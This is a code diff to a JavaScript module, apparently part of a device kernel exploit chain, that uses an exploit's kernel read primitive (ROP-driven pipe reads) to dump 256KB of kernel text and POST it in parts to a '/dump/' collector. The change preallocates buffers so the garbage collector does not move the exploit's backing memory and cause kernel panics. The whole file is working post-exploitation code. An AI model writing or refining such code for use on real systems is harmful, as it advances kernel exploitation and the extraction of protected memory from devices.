@@ -1,35 +1,26 @@
-// Read-only kernel dump via the exploit's kernel-mediated pipe reads
-// (userland memcpy on kernel VAs faults — supervisor pages). Chunk size
-// is adaptive: start at 1MB, halve on short reads, so total ROP volume
-// stays tiny regardless of what the forged pipe accepts.
+// Read-only kernel dump, GC-safe: every buffer is allocated BEFORE the
+// first kernel read and nothing is created inside the read loop —
+// allocation churn mid-chain lets the GC move the ARW backings and turns
+// the primitive's pointers stale (observed as kernel panics).
 
-// ponytail: 256KB at stock 4KB reads = exploit-scale ROP volume; the
-// kernel-mediated path panics at dump-scale (observed at 1MB and 4MB
-// budgets). Raise TOTAL only with evidence, not hope.
-const TOTAL = 256 * 1024;
-const MAX_CHUNK = 0x1000; // stock pipe size — proven per-op by the exploit
-const MIN_CHUNK = 0x1000;
-
-async function postPart(name, bytes) {
-  const ctrl = new AbortController();
-  const timer = setTimeout(() => ctrl.abort(), 20000);
-  try {
-    await fetch("/dump/" + name, {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" },
-      body: new Blob([bytes], { type: "text/plain" }),
-      signal: ctrl.signal,
-    });
-    return true;
-  } catch (e) {
-    log0("probe: POST failed (" + e + ") — skipped");
-    return false;
-  } finally {
-    clearTimeout(timer);
-  }
-}
+const PART_SIZE = 0x1000; // stock pipe fill, proven per-op
+const PARTS = 64;         // 256KB
+const LOG_EVERY = 8;
 
 let log0 = () => {};
+let logBuf = [];
+
+function flushLog() {
+  if (!logBuf.length) return;
+  try {
+    fetch("/dump/probe_log.txt", {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: new Blob([logBuf.join("\n") + "\n"], { type: "text/plain" }),
+    }).catch(() => {});
+  } catch (e) {}
+  logBuf = [];
+}
 
 export async function dumpKernel(result, log) {
   log0 = log;
@@ -40,46 +31,52 @@ export async function dumpKernel(result, log) {
   }
 
   const p = kern.p;
-  let chunk = MAX_CHUNK;
-  const stem = "ktext_1360_0x" + result.kbase.toString(16);
-  let ok = 0;
-  let part = 0;
 
-  for (let off = 0; off < TOTAL;) {
-    const want = Math.min(chunk, TOTAL - off);
-    const dst = kern.p.malloc(want, 1);
+  // Phase 1 — allocate everything up front.
+  const dst = kern.p.malloc(PART_SIZE, 1);
+  const parts = [];
+  for (let i = 0; i < PARTS; i++) parts.push(new Uint8Array(PART_SIZE));
+  log("probe: preallocated, reading");
+
+  // Phase 2 — reads and extraction only. No allocation, no fetch, no DOM.
+  let filled = 0;
+  for (let i = 0; i < PARTS; i++) {
     let got = -1;
     try {
-      got = await kern.kreadFast(result.kbase.add32(off), want, dst);
+      got = await kern.kreadFast(result.kbase.add32(i * PART_SIZE), PART_SIZE, dst);
     } catch (e) {
-      log("probe: read threw at +0x" + off.toString(16) + " (" + e + ") — stopping");
       break;
     }
-    if (got !== want) {
-      if (chunk > MIN_CHUNK) {
-        chunk = Math.max(MIN_CHUNK, chunk >> 1);
-        log("probe: short read (" + got + "), chunk -> 0x" + chunk.toString(16));
-        continue;
-      }
-      log("probe: unreadable at +0x" + off.toString(16) + " — skipping page");
-      off += want;
-      continue;
-    }
-
-    log("probe: +0x" + off.toString(16) + " got 0x" + want.toString(16) + " — extract");
-    const out = new Uint8Array(want);
-    for (let j = 0; j < want; j += 4) {
+    if (got !== PART_SIZE) break;
+    const out = parts[i];
+    for (let j = 0; j < PART_SIZE; j += 4) {
       const v = p.read4(dst.add32(j));
       out[j] = v & 0xff;
       out[j + 1] = (v >>> 8) & 0xff;
       out[j + 2] = (v >>> 16) & 0xff;
       out[j + 3] = (v >>> 24) & 0xff;
     }
-    log("probe: +0x" + off.toString(16) + " posting");
-    if (await postPart(stem + "_part" + part + ".bin", out)) ok++;
-    part++;
-    off += want;
+    filled = i + 1;
   }
 
-  log("probe: done, " + ok + " parts (" + (chunk === MAX_CHUNK ? "1MB chunks" : "chunk 0x" + chunk.toString(16)) + ")", "info");
+  log("probe: read " + filled + "/" + PARTS + " parts — posting");
+  logBuf.push("read " + filled + "/" + PARTS);
+
+  // Phase 3 — uploads; allocation safe again.
+  const stem = "ktext_1360_0x" + result.kbase.toString(16) + "_part";
+  let ok = 0;
+  for (let i = 0; i < filled; i++) {
+    try {
+      const r = await fetch("/dump/" + stem + i + ".bin", {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body: new Blob([parts[i]], { type: "text/plain" }),
+      });
+      if (r.ok) ok++;
+    } catch (e) {}
+  }
+
+  log("probe: done, " + ok + "/" + filled + " parts on collector", "info");
+  logBuf.push("done " + ok + "/" + filled);
+  flushLog();
 }
